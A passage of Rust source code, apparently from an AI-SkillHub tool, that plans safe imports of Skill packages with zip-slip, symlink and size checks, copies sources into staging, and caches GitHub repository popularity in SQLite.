            vec!["没有扫描到 SKILL.md；不能作为 Skill 来源继续安装。".to_string()]
        },
        rollback_summary: "当前只读取目录元数据；没有复制、移动、删除或创建软链接。".to_string(),
    })
}

fn build_package_source_import_plan(
    root: &Path,
    sources: &[SourceCard],
    input: &str,
) -> Result<SourceImportPlanCard, String> {
    let input_path = PathBuf::from(input);
    let path = if input_path.is_absolute() {
        input_path
    } else {
        root.join(input_path)
    };
    let extension = path
        .extension()
        .and_then(|value| value.to_str())
        .unwrap_or("")
        .to_ascii_lowercase();
    let display_name = path
        .file_stem()
        .and_then(|name| name.to_str())
        .unwrap_or("package-source")
        .to_string();
    let duplicate = sources
        .iter()
        .find(|source| normalize_lookup_key(&source.name) == normalize_lookup_key(&display_name));
    let extension_ok = extension == "zip" || extension == "skill";
    let file_exists = path.exists();
    let duplicate_reason = if let Some(source) = duplicate {
        format!(
            "已存在同名来源：{}。包导入前必须先改名或合并。",
            source.name
        )
    } else if !extension_ok {
        "包导入只接受 .zip 或 .skill 文件。".to_string()
    } else if !file_exists {
        "文件当前不存在；仍可生成计划，但不能进入真实解压。".to_string()
    } else {
        String::new()
    };
    let inspection = if extension_ok && file_exists && duplicate.is_none() {
        Some(inspect_package_archive(&path))
    } else {
        None
    };
    let inspection_blocking_checks = inspection
        .as_ref()
        .and_then(|result| result.as_ref().err().cloned())
        .map(|message| vec![message])
        .or_else(|| {
            inspection.as_ref().and_then(|result| {
                result
                    .as_ref()
                    .ok()
                    .filter(|item| !item.safe_to_extract || item.skill_count == 0)
                    .map(|item| {
                        if item.skill_count == 0 {
                            vec!["包内没有扫描到 SKILL.md，不能作为 Skill 来源继续安装。"
                                .to_string()]
                        } else {
                            item.blocking_checks.clone()
                        }
                    })
            })
        })
        .unwrap_or_default();
    let inspection_counts = inspection
        .as_ref()
        .and_then(|result| result.as_ref().ok())
        .cloned();
    let inspection_safe = inspection_counts
        .as_ref()
        .map(|item| item.safe_to_extract && item.skill_count > 0)
        .unwrap_or(false);
    let write_gate_status = if !extension_ok || duplicate.is_some() || !file_exists {
        "blocked"
    } else if inspection_safe {
        "dry-run-ready"
    } else {
        "locked"
    }
    .to_string();
    let safe_to_continue = inspection_safe;
    let status = if !extension_ok || duplicate.is_some() || !file_exists {
        "blocked"
    } else if safe_to_continue {
        "ready"
    } else {
        "locked"
    };
    let risk_level = if !extension_ok || duplicate.is_some() {
        "high"
    } else {
        "medium"
    };
    let mut blocking_checks = Vec::new();
    if !duplicate_reason.is_empty() {
        blocking_checks.push(duplicate_reason.clone());
    }
    blocking_checks.extend(inspection_blocking_checks);
    if safe_to_continue {
        blocking_checks
            .push("真实安装仍需备份 dry-run、恢复 dry-run、Release Gate 通过。".to_string());
    }
    let skill_count = inspection_counts
        .as_ref()
        .map(|item| item.skill_count)
        .unwrap_or(0);
    let prompt_count = inspection_counts
        .as_ref()
        .map(|item| item.prompt_count)
        .unwrap_or(0);

    Ok(SourceImportPlanCard {
        id: stable_id("source-import-package", input),
        import_kind: "zip".to_string(),
        input: input.to_string(),
        normalized_target: path.to_string_lossy().to_string(),
        target_root: source_import_target_root(root),
        target_path: source_import_target_path(root, &display_name),
        backup_path: source_import_backup_path(root, &display_name),
        display_name,
        status: status.to_string(),
        risk_level: risk_level.to_string(),
        write_gate_status,
        safe_to_continue,
        duplicate_source_id: duplicate
            .map(|source| source.id.clone())
            .unwrap_or_default(),
        duplicate_reason: duplicate_reason.clone(),
        skill_count,
        prompt_count,
        planned_steps: vec![
            "验证扩展名和文件可读性。".to_string(),
            "执行 zip-slip、路径穿越、符号链接和体积限制扫描。".to_string(),
            "统计包含 SKILL.md 的目录，并检查重复名称。".to_string(),
            "安全报告通过后，只允许先进入隔离 staging。".to_string(),
        ],
        install_plan_steps: vec![
            "创建只读检查记录和隔离 staging 目录。".to_string(),
            "安全解压到 app-next/.skillhub-next/staging/source-imports。".to_string(),
            "安全通过后创建 source-import 快照和备份 dry-run。".to_string(),
            "正式安装到 app-next/data/github_sources 仍需 Release Gate 单独解锁。".to_string(),
            "真实 Claude/Codex/Antigravity 接管继续等待 Release Gate。".to_string(),
        ],
        blocking_checks,
        rollback_summary:
            "当前最多写入隔离 staging；删除 staging 目录即可撤销，正式来源目录保持不变。"
                .to_string(),
    })
}

fn count_skill_dirs_in_path(root: &Path) -> Result<(usize, usize), String> {
    let mut stack = vec![(root.to_path_buf(), 0usize)];
    let mut visited = 0usize;
    let mut skill_count = 0usize;
    let mut prompt_count = 0usize;

    while let Some((directory, depth)) = stack.pop() {
        if visited >= 2_500 || depth > 8 {
            continue;
        }
        visited += 1;

        let entries = match fs::read_dir(&directory) {
            Ok(entries) => entries,
            Err(_) => continue,
        };
        let mut has_skill_md = false;
        let mut markdown_files = 0usize;

        for entry in entries.flatten() {
            let path = entry.path();
            let file_name = entry.file_name().to_string_lossy().to_string();
            let Ok(file_type) = entry.file_type() else {
                continue;
            };

            if file_type.is_dir() {
                if !should_skip_import_scan_dir(&file_name) {
                    stack.push((path, depth + 1));
                }
                continue;
            }

            if file_type.is_file() {
                if file_name.eq_ignore_ascii_case("SKILL.md") {
                    has_skill_md = true;
                } else if path
                    .extension()
                    .and_then(|extension| extension.to_str())
                    .map(|extension| extension.eq_ignore_ascii_case("md"))
                    .unwrap_or(false)
                {
                    markdown_files += 1;
                } else if depth <= 2
                    && path
                        .extension()
                        .and_then(|extension| extension.to_str())
                        .map(|extension| {
                            extension.eq_ignore_ascii_case("zip")
                                || extension.eq_ignore_ascii_case("skill")
                        })
                        .unwrap_or(false)
                {
                    skill_count += count_skill_dirs_in_archive_preview(&path);
                }
            }
        }

        if has_skill_md {
            skill_count += 1;
        } else if depth <= 2 && markdown_files > 0 {
            prompt_count += markdown_files.min(6);
        }
    }

    Ok((skill_count, prompt_count))
}

fn count_skill_dirs_in_archive_preview(path: &Path) -> usize {
    let Ok(file) = fs::File::open(path) else {
        return 0;
    };
    let Ok(mut archive) = ZipArchive::new(file) else {
        return 0;
    };
    let mut skill_dirs = HashSet::new();
    let limit = archive.len().min(5_000);

    for index in 0..limit {
        let Ok(file) = archive.by_index(index) else {
            continue;
        };
        let Some(relative_path) = safe_archive_entry_path(&file) else {
            continue;
        };
        if !file.is_file() {
            continue;
        }
        if relative_path
            .file_name()
            .and_then(|name| name.to_str())
            .map(|name| name.eq_ignore_ascii_case("SKILL.md"))
            .unwrap_or(false)
        {
            if let Some(parent) = relative_path.parent() {
                skill_dirs.insert(parent.to_string_lossy().to_string());
            }
        }
    }

    skill_dirs.len()
}

#[derive(Clone)]
struct PackageArchiveInspection {
    safe_to_extract: bool,
    file_count: usize,
    uncompressed_bytes: u64,
    skill_count: usize,
    prompt_count: usize,
    blocking_checks: Vec<String>,
}

fn inspect_package_archive(path: &Path) -> Result<PackageArchiveInspection, String> {
    let file = fs::File::open(path)
        .map_err(|error| format!("Cannot open package archive {}: {}", path.display(), error))?;
    let mut archive = ZipArchive::new(file)
        .map_err(|error| format!("Cannot read package archive {}: {}", path.display(), error))?;
    let mut blocking_checks = Vec::new();
    let mut file_count = 0usize;
    let mut uncompressed_bytes = 0u64;
    let mut skill_dirs = HashSet::new();
    let mut prompt_count = 0usize;

    if archive.is_empty() {
        blocking_checks.push("包是空的。".to_string());
    }

    for index in 0..archive.len() {
        let file = archive
            .by_index(index)
            .map_err(|error| format!("Cannot inspect package entry {}: {}", index, error))?;
        let Some(relative_path) = safe_archive_entry_path(&file) else {
            blocking_checks.push(format!(
                "发现不安全路径：{}",
                compact_note(file.name())
                    .chars()
                    .take(160)
                    .collect::<String>()
            ));
            continue;
        };

        if archive_entry_is_symlink(&file) {
            blocking_checks.push(format!(
                "包内含符号链接，已拒绝：{}",
                relative_path.display()
            ));
            continue;
        }

        if archive_entry_should_skip(&relative_path) {
            continue;
        }

        if file.is_file() {
            file_count += 1;
            uncompressed_bytes = uncompressed_bytes.saturating_add(file.size());
            if file_count > SOURCE_IMPORT_MAX_FILES {
                blocking_checks.push(format!("包内文件数量超过 {} 个。", SOURCE_IMPORT_MAX_FILES));
                break;
            }
            if uncompressed_bytes > 80 * 1024 * 1024 {
                blocking_checks.push("包内未压缩体积超过 80 MB。".to_string());
                break;
            }

            if relative_path
                .file_name()
                .and_then(|name| name.to_str())
                .map(|name| name.eq_ignore_ascii_case("SKILL.md"))
                .unwrap_or(false)
            {
                if let Some(parent) = relative_path.parent() {
                    skill_dirs.insert(parent.to_string_lossy().to_string());
                }
            } else if relative_path
                .extension()
                .and_then(|extension| extension.to_str())
                .map(|extension| extension.eq_ignore_ascii_case("md"))
                .unwrap_or(false)
                && relative_path.components().count() <= 3
            {
                prompt_count += 1;
            }
        }
    }

    let safe_to_extract = blocking_checks.is_empty();
    Ok(PackageArchiveInspection {
        safe_to_extract,
        file_count,
        uncompressed_bytes,
        skill_count: skill_dirs.len(),
        prompt_count: prompt_count.min(24),
        blocking_checks,
    })
}

fn extract_package_archive_filtered(path: &Path, destination: &Path) -> Result<(), String> {
    fs::create_dir_all(destination).map_err(|error| {
        format!(
            "Cannot create package staging destination {}: {}",
            destination.display(),
            error
        )
    })?;
    let file = fs::File::open(path)
        .map_err(|error| format!("Cannot open package archive {}: {}", path.display(), error))?;
    let mut archive = ZipArchive::new(file)
        .map_err(|error| format!("Cannot read package archive {}: {}", path.display(), error))?;

    for index in 0..archive.len() {
        let mut entry = archive
            .by_index(index)
            .map_err(|error| format!("Cannot extract package entry {}: {}", index, error))?;
        let Some(relative_path) = safe_archive_entry_path(&entry) else {
            return Err(format!("Unsafe archive path refused: {}", entry.name()));
        };
        if archive_entry_is_symlink(&entry) || archive_entry_should_skip(&relative_path) {
            continue;
        }

        let output_path = destination.join(&relative_path);
        if !output_path.starts_with(destination) {
            return Err(format!(
                "Archive entry escaped staging folder: {}",
                entry.name()
            ));
        }

        if entry.is_dir() {
            fs::create_dir_all(&output_path).map_err(|error| {
                format!(
                    "Cannot create package staging directory {}: {}",
                    output_path.display(),
                    error
                )
            })?;
            continue;
        }

        if let Some(parent) = output_path.parent() {
            fs::create_dir_all(parent).map_err(|error| {
                format!(
                    "Cannot create package staging parent {}: {}",
                    parent.display(),
                    error
                )
            })?;
        }
        let mut output_file = fs::File::create(&output_path).map_err(|error| {
            format!(
                "Cannot create package staging file {}: {}",
                output_path.display(),
                error
            )
        })?;
        io::copy(&mut entry, &mut output_file).map_err(|error| {
            format!(
                "Cannot write package staging file {}: {}",
                output_path.display(),
                error
            )
        })?;
    }
    Ok(())
}

fn safe_archive_entry_path(file: &zip::read::ZipFile<'_>) -> Option<PathBuf> {
    let enclosed = file.enclosed_name()?.to_path_buf();
    if enclosed.components().any(|component| {
        matches!(
            component,
            Component::ParentDir | Component::RootDir | Component::Prefix(_)
        )
    }) {
        return None;
    }
    Some(enclosed)
}

fn archive_entry_is_symlink(file: &zip::read::ZipFile<'_>) -> bool {
    file.unix_mode()
        .map(|mode| mode & 0o170000 == 0o120000)
        .unwrap_or(false)
}

fn archive_entry_should_skip(path: &Path) -> bool {
    path.components().any(|component| {
        if let Component::Normal(value) = component {
            should_skip_import_scan_dir(&value.to_string_lossy())
        } else {
            false
        }
    })
}

fn local_copy_preflight(root: &Path) -> Result<(usize, u64), String> {
    let mut stack = vec![(root.to_path_buf(), 0usize)];
    let mut file_count = 0usize;
    let mut byte_count = 0u64;
    while let Some((directory, depth)) = stack.pop() {
        if depth > 10 {
            continue;
        }
        let entries = fs::read_dir(&directory).map_err(|error| {
            format!(
                "Cannot read local source {}: {}",
                directory.display(),
                error
            )
        })?;
        for entry in entries.flatten() {
            let path = entry.path();
            let file_name = entry.file_name().to_string_lossy().to_string();
            let Ok(file_type) = entry.file_type() else {
                continue;
            };
            if file_type.is_dir() {
                if !should_skip_import_scan_dir(&file_name) {
                    stack.push((path, depth + 1));
                }
            } else if file_type.is_file() {
                file_count += 1;
                byte_count = byte_count.saturating_add(
                    entry
                        .metadata()
                        .map(|metadata| metadata.len())
                        .unwrap_or_default(),
                );
            }
        }
    }
    Ok((file_count, byte_count))
}

fn copy_directory_filtered(source: &Path, destination: &Path) -> Result<(), String> {
    copy_directory_filtered_with_options(source, destination, false)
}

fn copy_directory_filtered_with_options(
    source: &Path,
    destination: &Path,
    preserve_git: bool,
) -> Result<(), String> {
    fs::create_dir_all(destination).map_err(|error| {
        format!(
            "Cannot create staging destination {}: {}",
            destination.display(),
            error
        )
    })?;
    let mut stack = vec![(source.to_path_buf(), destination.to_path_buf(), 0usize)];
    while let Some((source_dir, destination_dir, depth)) = stack.pop() {
        if depth > 10 {
            continue;
        }
        fs::create_dir_all(&destination_dir).map_err(|error| {
            format!(
                "Cannot create staging directory {}: {}",
                destination_dir.display(),
                error
            )
        })?;
        let entries = fs::read_dir(&source_dir).map_err(|error| {
            format!(
                "Cannot read local source directory {}: {}",
                source_dir.display(),
                error
            )
        })?;
        for entry in entries.flatten() {
            let source_path = entry.path();
            let file_name = entry.file_name();
            let file_name_text = file_name.to_string_lossy().to_string();
            let destination_path = destination_dir.join(&file_name);
            let Ok(file_type) = entry.file_type() else {
                continue;
            };
            if file_type.is_dir() {
                if !should_skip_import_copy_dir(&file_name_text, preserve_git) {
                    stack.push((source_path, destination_path, depth + 1));
                }
            } else if file_type.is_file() {
                fs::copy(&source_path, &destination_path).map_err(|error| {
                    format!(
                        "Cannot copy {} to staging {}: {}",
                        source_path.display(),
                        destination_path.display(),
                        error
                    )
                })?;
            }
        }
    }
    Ok(())
}

fn should_skip_import_copy_dir(name: &str, preserve_git: bool) -> bool {
    if preserve_git && name.eq_ignore_ascii_case(".git") {
        return false;
    }
    should_skip_import_scan_dir(name)
}

fn count_files_in_path(root: &Path) -> Result<usize, String> {
    let mut stack = vec![root.to_path_buf()];
    let mut count = 0usize;
    while let Some(directory) = stack.pop() {
        let entries = fs::read_dir(&directory)
            .map_err(|error| format!("Cannot count files in {}: {}", directory.display(), error))?;
        for entry in entries.flatten() {
            let Ok(file_type) = entry.file_type() else {
                continue;
            };
            if file_type.is_dir() {
                stack.push(entry.path());
            } else if file_type.is_file() {
                count += 1;
            }
        }
    }
    Ok(count)
}

fn directory_size_bytes(root: &Path) -> Result<u64, String> {
    let mut stack = vec![root.to_path_buf()];
    let mut bytes = 0u64;
    while let Some(directory) = stack.pop() {
        let entries = fs::read_dir(&directory).map_err(|error| {
            format!(
                "Cannot calculate directory size for {}: {}",
                directory.display(),
                error
            )
        })?;
        for entry in entries.flatten() {
            let Ok(file_type) = entry.file_type() else {
                continue;
            };
            if file_type.is_dir() {
                stack.push(entry.path());
            } else if file_type.is_file() {
                bytes = bytes.saturating_add(
                    entry
                        .metadata()
                        .map(|metadata| metadata.len())
                        .unwrap_or_default(),
                );
            }
        }
    }
    Ok(bytes)
}

fn should_skip_import_scan_dir(name: &str) -> bool {
    matches!(
        name.to_ascii_lowercase().as_str(),
        ".git"
            | ".hg"
            | ".svn"
            | "node_modules"
            | "target"
            | "build"
            | ".next"
            | ".nuxt"
            | ".venv"
            | "__pycache__"
            | ".skillhub-next"
            | "webview2-data"
    )
}

fn normalized_github_repo_url(owner: &str, repo: &str) -> String {
    format!("https://github.com/{}/{}.git", owner, repo)
}

fn normalize_path_for_compare(path: &str) -> String {
    path.trim()
        .replace('/', "\\")
        .trim_end_matches('\\')
        .to_ascii_lowercase()
}

fn normalize_lookup_key(value: &str) -> String {
    value.trim().to_ascii_lowercase()
}

fn parse_github_repo(input: &str) -> Option<(String, String)> {
    let mut value = input
        .trim()
        .trim_matches('"')
        .trim_matches('\'')
        .to_string();
    if value.is_empty() {
        return None;
    }
    if let Some((without_hash, _)) = value.split_once('#') {
        value = without_hash.to_string();
    }
    if let Some((without_query, _)) = value.split_once('?') {
        value = without_query.to_string();
    }
    value = value.trim_end_matches('/').to_string();

    let path = if let Some(rest) = value.strip_prefix("git@github.com:") {
        rest.to_string()
    } else if let Some(rest) = value.strip_prefix("ssh://git@github.com/") {
        rest.to_string()
    } else if let Some(rest) = value.strip_prefix("https://github.com/") {
        rest.to_string()
    } else {
        value.strip_prefix("http://github.com/")?.to_string()
    };

    let mut parts = path.split('/').filter(|part| !part.is_empty());
    let owner = parts.next()?.trim();
    let repo = parts.next()?.trim().trim_end_matches(".git");
    if owner.is_empty() || repo.is_empty() || parts.next().is_some() {
        return None;
    }
    if !owner
        .chars()
        .all(|character| character.is_ascii_alphanumeric() || character == '-' || character == '_')
        || !repo.chars().all(|character| {
            character.is_ascii_alphanumeric()
                || character == '-'
                || character == '_'
                || character == '.'
        })
    {
        return None;
    }

    Some((owner.to_string(), repo.to_string()))
}

fn hydrate_source_urls_from_git(root: &Path, sources: &mut [SourceCard]) {
    for source in sources {
        if parse_github_repo(&source.url).is_some() {
            continue;
        }
        if let Some(url) = infer_source_github_url(root, source) {
            source.url = url;
        }
    }
}

fn infer_source_github_url(root: &Path, source: &SourceCard) -> Option<String> {
    for path in source_candidate_paths(root, source) {
        let metadata_path = path.join(MANAGED_SOURCE_METADATA_FILE);
        if let Ok(metadata) = fs::read_to_string(&metadata_path) {
            if let Ok(payload) = serde_json::from_str::<Value>(&metadata) {
                if let Some(url) = payload.get("url").and_then(Value::as_str) {
                    if let Some((owner, repo)) = parse_github_repo(url) {
                        return Some(normalized_github_repo_url(&owner, &repo));
                    }
                }
            }
        }
        let config_path = path.join(".git").join("config");
        let Ok(config) = fs::read_to_string(config_path) else {
            continue;
        };
        let Some(origin) = parse_git_origin_url(&config) else {
            continue;
        };
        let Some((owner, repo)) = parse_github_repo(&origin) else {
            continue;
        };
        return Some(normalized_github_repo_url(&owner, &repo));
    }
    None
}

fn source_candidate_paths(root: &Path, source: &SourceCard) -> Vec<PathBuf> {
    let sources_dir = active_sources_dir(root);
    let mut candidates = Vec::new();
    for value in [&source.local_path, &source.id, &source.name] {
        let value = value.trim();
        if value.is_empty() {
            continue;
        }
        let path = PathBuf::from(value);
        if path.is_absolute() {
            candidates.push(path);
        } else {
            candidates.push(root.join(value));
            candidates.push(sources_dir.join(value));
        }
    }

    let mut seen = HashSet::new();
    candidates
        .into_iter()
        .filter(|path| seen.insert(normalize_path_for_compare(&path.display().to_string())))
        .collect()
}

fn parse_git_origin_url(config: &str) -> Option<String> {
    let mut in_origin = false;
    for raw_line in config.lines() {
        let line = raw_line.trim();
        if line.starts_with('[') {
            let lowered = line.to_ascii_lowercase();
            in_origin = lowered == "[remote \"origin\"]" || lowered == "[remote 'origin']";
            continue;
        }
        if !in_origin {
            continue;
        }
        let Some((key, value)) = line.split_once('=') else {
            continue;
        };
        if key.trim().eq_ignore_ascii_case("url") {
            let value = value.trim();
            if !value.is_empty() {
                return Some(value.to_string());
            }
        }
    }
    None
}

fn fetch_github_popularity(owner: &str, repo: &str) -> Result<GithubPopularityFetch, String> {
    let url = format!("https://api.github.com/repos/{}/{}", owner, repo);
    let mut request = ureq::get(&url)
        .set("User-Agent", "AI-SkillHub")
        .set("Accept", "application/vnd.github+json");
    let token = github_api_token();
    if let Some(token) = token.as_deref() {
        request = request.set("Authorization", &format!("Bearer {token}"));
    }
    let response = request
        .call()
        .map_err(|error| github_api_error_message(owner, repo, error))?;
    let payload: Value = response.into_json().map_err(|error| {
        format!(
            "Cannot parse GitHub API response for {}/{}: {}",
            owner, repo, error
        )
    })?;

    Ok(GithubPopularityFetch {
        created_at: payload
            .get("created_at")
            .and_then(Value::as_str)
            .unwrap_or("")
            .to_string(),
        stars: json_u64(&payload, "stargazers_count"),
        forks: json_u64(&payload, "forks_count"),
        open_issues: json_u64(&payload, "open_issues_count"),
        last_updated_at: payload
            .get("pushed_at")
            .or_else(|| payload.get("updated_at"))
            .and_then(Value::as_str)
            .unwrap_or("")
            .to_string(),
    })
}

fn github_api_token() -> Option<String> {
    for key in ["GITHUB_TOKEN", "GH_TOKEN"] {
        if let Ok(value) = std::env::var(key) {
            let token = value.trim();
            if !token.is_empty() {
                return Some(token.to_string());
            }
        }
    }
    None
}

fn github_api_error_message(owner: &str, repo: &str, error: ureq::Error) -> String {
    match error {
        ureq::Error::Status(code, response) => {
            let remaining = response
                .header("x-ratelimit-remaining")
                .unwrap_or("")
                .to_string();
            let reset = response
                .header("x-ratelimit-reset")
                .unwrap_or("")
                .to_string();
            let body = response
                .into_string()
                .unwrap_or_default()
                .chars()
                .take(240)
                .collect::<String>();
            format_github_api_status_error(code, owner, repo, &remaining, &reset, &body)
        }
        ureq::Error::Transport(error) => format!(
            "无法连接 GitHub API（{}/{}）：{}。请检查网络或代理后重试。",
            owner,
            repo,
            compact_note(&error.to_string())
        ),
    }
}

fn format_github_api_status_error(
    code: u16,
    owner: &str,
    repo: &str,
    remaining: &str,
    reset: &str,
    body: &str,
) -> String {
    let rate_limited = matches!(code, 403 | 429) && remaining.trim() == "0";
    if rate_limited {
        let reset_label = reset
            .trim()
            .parse::<u64>()
            .ok()
            .map(format_unix_epoch_utc)
            .filter(|value| !value.is_empty())
            .unwrap_or_else(|| "GitHub 返回的恢复时间".to_string());
        return format!(
            "GitHub API 请求额度已用尽（{owner}/{repo}）；预计 {reset_label} 后恢复。无需反复重试：请优先使用系统 Git/ZIP，私有仓库可配置 GITHUB_TOKEN 或 GH_TOKEN。"
        );
    }
    let detail = compact_note(body);
    if detail.is_empty() {
        format!("GitHub API 返回 HTTP {code}（{owner}/{repo}）。")
    } else {
        format!(
            "GitHub API 返回 HTTP {code}（{owner}/{repo}）：{}",
            detail.chars().take(180).collect::<String>()
        )
    }
}

fn format_unix_epoch_utc(epoch_seconds: u64) -> String {
    let days = (epoch_seconds / 86_400) as i64;
    let seconds = epoch_seconds % 86_400;
    let (year, month, day) = civil_date_from_unix_days(days);
    let hour = seconds / 3_600;
    let minute = (seconds % 3_600) / 60;
    let second = seconds % 60;
    format!("{year:04}-{month:02}-{day:02} {hour:02}:{minute:02}:{second:02} UTC")
}

// Howard Hinnant's civil-from-days algorithm, adapted for Unix day zero.
fn civil_date_from_unix_days(days_since_epoch: i64) -> (i64, u64, u64) {
    let z = days_since_epoch + 719_468;
    let era = if z >= 0 { z } else { z - 146_096 } / 146_097;
    let day_of_era = z - era * 146_097;
    let year_of_era =
        (day_of_era - day_of_era / 1_460 + day_of_era / 36_524 - day_of_era / 146_096) / 365;
    let mut year = year_of_era + era * 400;
    let day_of_year = day_of_era - (365 * year_of_era + year_of_era / 4 - year_of_era / 100);
    let month_prime = (5 * day_of_year + 2) / 153;
    let day = day_of_year - (153 * month_prime + 2) / 5 + 1;
    let month = month_prime + if month_prime < 10 { 3 } else { -9 };
    year += if month <= 2 { 1 } else { 0 };
    (year, month as u64, day as u64)
}

fn source_popularity_cache_status_for_error(error: &str) -> &'static str {
    let text = error.to_lowercase();
    if text.contains("status 403")
        || text.contains("status code 403")
        || text.contains("status 429")
        || text.contains("status code 429")
        || text.contains("rate limit")
        || text.contains("api rate limit")
        || text.contains("too many requests")
        || text.contains("network")
        || text.contains("failed to connect")
        || text.contains("dns")
        || text.contains("timed out")
        || text.contains("timeout")
        || text.contains("proxy")
        || text.contains("tls")
        || text.contains("status 500")
        || text.contains("status 502")
        || text.contains("status 503")
        || text.contains("status 504")
    {
        "deferred"
    } else {
        "error"
    }
}

fn source_popularity_error_should_pause_batch(error: &str) -> bool {
    source_popularity_cache_status_for_error(error) == "deferred"
}

fn source_popularity_cache_is_recent(
    connection: &Connection,
    source_id: &str,
    now_nanos: u128,
) -> Result<bool, String> {
    let cached = connection
        .query_row(
            "SELECT fetched_at, cache_status FROM source_popularity_cache WHERE source_id = ?1",
            params![source_id],
            |row| Ok((row.get::<_, String>(0)?, row.get::<_, String>(1)?)),
        )
        .optional()
        .map_err(|error| format!("Cannot read source popularity cache freshness: {}", error))?;

    let Some((fetched_at, cache_status)) = cached else {
        return Ok(false);
    };
    let fetched_at_nanos = fetched_at.parse::<u128>().unwrap_or_default();
    if fetched_at_nanos == 0 || now_nanos <= fetched_at_nanos {
        return Ok(false);
    }
    let age_nanos = now_nanos - fetched_at_nanos;
    let ttl_nanos = if source_popularity_cache_status_for_error(&cache_status) == "deferred"
        || cache_status == "deferred"
        || cache_status == "rate-limited"
        || cache_status == "stale"
    {
        SOURCE_POPULARITY_DEFERRED_BACKOFF_NANOS
    } else if cache_status == "fresh" {
        SOURCE_POPULARITY_FRESH_TTL_NANOS
    } else {
        0
    };

    Ok(ttl_nanos > 0 && age_nanos < ttl_nanos)
}

#[allow(clippy::too_many_arguments)]
fn upsert_source_popularity_cache(
    connection: &Connection,
    source: &SourceCard,
    owner: &str,
    repo: &str,
    popularity: &GithubPopularityFetch,
    fetched_at: &str,
    cache_status: &str,
    error: &str,
) -> Result<(), String> {
    connection
        .execute(
            "INSERT INTO source_popularity_cache (
                source_id, source_name, url, owner, repo, created_at, stars, forks,
                open_issues, last_updated_at, fetched_at, cache_status, error
            ) VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8, ?9, ?10, ?11, ?12, ?13)
            ON CONFLICT(source_id) DO UPDATE SET
                source_name = excluded.source_name,
                url = excluded.url,
                owner = excluded.owner,
                repo = excluded.repo,
                created_at = CASE WHEN excluded.cache_status = 'fresh' THEN excluded.created_at ELSE source_popularity_cache.created_at END,
                stars = CASE WHEN excluded.cache_status = 'fresh' THEN excluded.stars ELSE source_popularity_cache.stars END,
                forks = CASE WHEN excluded.cache_status = 'fresh' THEN excluded.forks ELSE source_popularity_cache.forks END,
                open_issues = CASE WHEN excluded.cache_status = 'fresh' THEN excluded.open_issues ELSE source_popularity_cache.open_issues END,
                last_updated_at = CASE WHEN excluded.cache_status = 'fresh' THEN excluded.last_updated_at ELSE source_popularity_cache.last_updated_at END,
                fetched_at = excluded.fetched_at,
                cache_status = excluded.cache_status,
                error = excluded.error",
            params![
                &source.id,
                &source.name,
                &source.url,
                owner,
                repo,
                &popularity.created_at,
                popularity.stars as i64,
                popularity.forks as i64,
                popularity.open_issues as i64,
                &popularity.last_updated_at,
                fetched_at,
                cache_status,
                compact_note(error)
            ],
        )
        .map_err(|error| format!("Cannot write source popularity cache: {}", error))?;

    if cache_status == "fresh" {
        insert_source_popularity_history(
            connection,
            source,
            owner,
            repo,
            popularity,
            fetched_at,
            cache_status,
            error,
        )?;
    }

    Ok(())
}

#[allow(clippy::too_many_arguments)]
fn insert_source_popularity_history(
    connection: &Connection,
    source: &SourceCard,
    owner: &str,
    repo: &str,
    popularity: &GithubPopularityFetch,
    sampled_at: &str,
    cache_status: &str,
    error: &str,
) -> Result<(), String> {
    let history_id = format!(
        "source-popularity-history-{}-{}",
        sampled_at,
        stable_id("source", &source.id)
    );
    connection
        .execute(
            "INSERT INTO source_popularity_history (
                id, source_id, source_name, owner, repo, stars, forks, open_issues,
                last_updated_at, sampled_at, cache_status, error
            ) VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8, ?9, ?10, ?11, ?12)
            ON CONFLICT(id) DO UPDATE SET
                source_name = excluded.source_name,
                owner = excluded.owner,
                repo = excluded.repo,
                stars = excluded.stars,
                forks = excluded.forks,
                open_issues = excluded.open_issues,
                last_updated_at = excluded.last_updated_at,
                cache_status = excluded.cache_status,
                error = excluded.error",
            params![
                history_id,
                &source.id,
                &source.name,
                owner,
                repo,
                popularity.stars as i64,
                popularity.forks as i64,
                popularity.open_issues as i64,
                &popularity.last_updated_at,
                sampled_at,
                cache_status,
                compact_note(error)
            ],
        )
        .map_err(|error| format!("Cannot write source popularity history: {}", error))?;

    Ok(())
}

fn read_indexed_audit_events(connection: &Connection) -> Result<Vec<AuditEventCard>, String> {
    let mut statement = connection
        .prepare(
            "SELECT id, event_type, summary, detail_json, created_at
            FROM audit_events
            ORDER BY CAST(created_at AS INTEGER) DESC
            LIMIT 20",
        )
        .map_err(|error| format!("Cannot prepare audit event query: {}", error))?;

    let rows = statement
        .query_map([], |row| {
            Ok(AuditEventCard {
                id: row.get(0)?,
                event_type: row.get(1)?,
                summary: row.get(2)?,
                detail_json: row.get(3)?,
                created_at: row.get(4)?,
            })
        })
        .map_err(|error| format!("Cannot read audit events: {}", error))?;

    collect_rows(rows, "audit event")
}

fn read_indexed_agents(connection: &Connection) -> Result<Vec<AgentCard>, String> {
    let mut statement = connection
        .prepare(
            "SELECT id, name, skills_path, detected, managed, enabled
            FROM agents
            ORDER BY lower(name)",
        )
        .map_err(|error| format!("Cannot prepare indexed agent query: {}", error))?;

    let rows = statement
        .query_map([], |row| {
            let mut agent = AgentCard {
                id: row.get(0)?,
                name: row.get(1)?,
                path: row.get(2)?,
                detected: row.get::<_, i64>(3)? != 0,
                managed: row.get::<_, i64>(4)? != 0,
                enabled: row.get::<_, i64>(5)? != 0,
                skill_count: 0,
            };
            normalize_directory_only_agent_detection(&mut agent);
            Ok(agent)
        })
        .map_err(|error| format!("Cannot read indexed agents: {}", error))?;

    collect_rows(rows, "agent")
}

fn normalize_directory_only_agent_detection(agent: &mut AgentCard) {
    if agent.id == "antigravity" && !command_exists("antigravity") {
        agent.detected = false;
        agent.managed = false;
        agent.enabled = false;
    }
}

fn command_exists(command: &str) -> bool {
    let probe = if cfg!(windows) { "where.exe" } else { "which" };
    Command::new(probe)
        .arg(command)
        .output()
        .map(|output| output.status.success())
        .unwrap_or(false)
}

fn read_indexed_agent_adapters(connection: &Connection) -> Result<Vec<AgentAdapterCard>, String> {
    let mut statement = connection
        .prepare(
            "SELECT
                id,
                name,
                vendor,
                skills_path_hint,
                detection_kind,
                install_scope,
                capability_level,
                docs_url,
                status,
                detected,
                managed,
                enabled
            FROM agent_adapters
            ORDER BY
                detected DESC,
                CASE id
                    WHEN 'claude' THEN 0
                    WHEN 'codex' THEN 1
                    WHEN 'antigravity' THEN 2
                    ELSE 3
                END,
                lower(name)",
        )
        .map_err(|error| format!("Cannot prepare agent adapter query: {}", error))?;

